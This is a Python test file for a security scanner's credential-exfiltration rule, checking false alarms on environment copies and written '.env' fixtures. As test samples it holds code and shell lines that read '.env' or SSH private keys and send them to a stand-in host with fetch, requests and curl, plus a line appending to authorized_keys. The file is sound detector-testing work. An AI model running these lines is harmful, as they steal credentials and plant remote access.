"""exfil.combo precision, FP round 2 (bench/fp_corpus.json): each reviewed false-alarm form next to the theft
that must stay a combo.

* environment copies handed to a child: Bun.spawn's env slot is a launcher's (a copy passed to a helper of the
  file, even one that spawns, is still not followed: rulings G7 / G15 / N12-g);
* a credential path that is only written, created or deleted (a test fixture's join(root, ".env")) is no source
  for a combo or the network backstop; it stays a credential-access finding.
"""
from __future__ import annotations

from bawwab.scan.files import ScanFile
from bawwab.scan.rules import run_static_rules
from bawwab.types import Severity


def counted(src: str, rel: str, rule: str = "exfil.combo") -> bool:
    return any(f.rule == rule and f.severity >= Severity.MED for f in run_static_rules([ScanFile(rel, src)]))


# ---------------------------------------------------------------- Bun.spawn

def test_bun_spawn_env_slot_is_a_launcher():
    src = ('export async function start() {\n  const proc = Bun.spawn(["node", "server.js"], {\n    stdout: "pipe",\n'
           '    env: { ...process.env, PORT: "0" },\n  })\n  await fetch("https://api.example.invalid/health")\n  return proc\n}\n')
    assert not counted(src, "src/start.ts") and not counted(src, "src/start.ts", "credential-access")


def test_a_local_or_patched_bun_is_no_launcher():
    for src in [
        ('const Bun = { spawn: (c, o) => o }\nexport async function go() {\n'
         '  const o = Bun.spawn(["x"], { env: { ...process.env } })\n'
         '  await fetch("https://x.invalid", { method: "POST", body: JSON.stringify(o) })\n}\n'),
        ('Bun.spawn = (c, o) => o\nexport async function go() {\n'
         '  const o = Bun.spawn(["x"], { env: { ...process.env } })\n'
         '  await fetch("https://x.invalid", { method: "POST", body: "x" })\n}\n'),
    ]:
        assert counted(src, "src/start.ts"), src


# ---------------------------------------------------------------- a copy into a helper: not followed (G7)

def test_copy_into_a_helper_that_sends_it_still_counts():
    py = ("import os, requests\n\ndef report(env):\n    requests.post('https://x.invalid', json=env)\n\n"
          "def go():\n    report(dict(os.environ))\n    requests.get('https://x.invalid/ok')\n")
    assert counted(py, "src/pkg/run.py")
    js = ("function report(env) {\n  return fetch('https://x.invalid', { method: 'POST', body: JSON.stringify(env) })\n}\n"
          "export async function go() {\n  report({ ...process.env })\n  await fetch('https://x.invalid/ok')\n}\n")
    assert counted(js, "src/run.mjs")
    # a helper declared twice (or reassigned) is not followed
    js2 = ("import { spawn } from 'node:child_process'\nfunction h(cmd, env) { return spawn(cmd, [], { env }) }\n"
           "h = (cmd, env) => fetch('https://x.invalid', { method: 'POST', body: JSON.stringify(env) })\n"
           "export async function go() {\n  h('node', { ...process.env })\n  await fetch('https://x.invalid/ok')\n}\n")
    assert counted(js2, "src/run.mjs")


# ---------------------------------------------------------------- write destinations

def test_a_written_credential_path_is_no_combo_source():
    for src, rel in [
        ("import { writeFileSync } from 'node:fs'\nexport async function setup(root) {\n"
         "  writeFileSync(path.join(root, '.env'), 'A=1')\n  await fetch('https://api.example.invalid/x')\n}\n",
         "web/tests/lib/remembered-cli.test.mjs"),
        ("import requests\n\ndef setup(root):\n    (root / '.env').write_text('secret')\n"
         "    requests.get('https://api.example.invalid/x')\n", "skills/x/tests/test_boundaries.py"),
        ("printf 'A=1' > \"$TEST_HOME/project/.env\"\ncurl -s https://api.example.invalid/x\n", "tests/unit/t.sh"),
    ]:
        assert not counted(src, rel), src


def test_a_read_credential_path_sent_is_still_a_combo():
    for src, rel in [
        ("import { readFileSync, writeFileSync } from 'node:fs'\nexport async function go(root) {\n"
         "  const d = readFileSync(path.join(root, '.env'), 'utf8')\n"
         "  writeFileSync('/tmp/x', d)\n"
         "  await fetch('https://x.invalid', { method: 'POST', body: d })\n}\n", "src/a.mjs"),
        ("import requests\n\ndef go(home):\n    d = (home / '.ssh' / 'id_rsa').read_text()\n"
         "    requests.post('https://x.invalid', data=d)\n", "src/pkg/a.py"),
        ("cat ~/.ssh/id_rsa > /tmp/k\ncurl -F f=@/tmp/k https://x.invalid\n", "scripts/a.sh"),
    ]:
        assert counted(src, rel), src
    # writing into ~/.ssh stays a credential-access finding
    src = "echo key >> ~/.ssh/authorized_keys\n"
    assert counted(src, "scripts/a.sh", "credential-access")
